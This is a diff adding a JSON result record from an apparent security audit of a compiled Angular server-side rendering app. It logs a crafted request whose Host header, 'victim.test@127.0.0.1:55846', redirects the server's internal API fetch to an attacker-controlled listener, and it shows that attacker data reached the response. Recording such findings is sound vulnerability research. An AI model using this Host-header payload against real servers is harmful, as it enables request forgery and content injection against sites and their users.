@@ -1,0 +1,19 @@
+{
+  "scenario": "compiled Angular integration standalone SSR app on macOS",
+  "serverEntry": "/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular/integration/platform-server/dist/standalone/server/server.mjs",
+  "craftedRequest": {
+    "requestTarget": "/http-transferstate-lazy",
+    "hostHeader": "victim.test@127.0.0.1:55846"
+  },
+  "responseHead": "HTTP/1.1 200 OK\r\nX-Powered-By: Express\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 1138\r\nETag: W/\"472-etCC2VtKpwptD58Pch06aXE4+hc\"\r\nDate: Wed, 29 Apr 2026 08:59:02 GMT\r\nConnection: close",
+  "responseContainsAttackerData": true,
+  "attackerHits": [
+    {
+      "method": "GET",
+      "url": "/api-2",
+      "host": "127.0.0.1:55846",
+      "authorization": null,
+      "bodyLength": 0
+    }
+  ]
+}
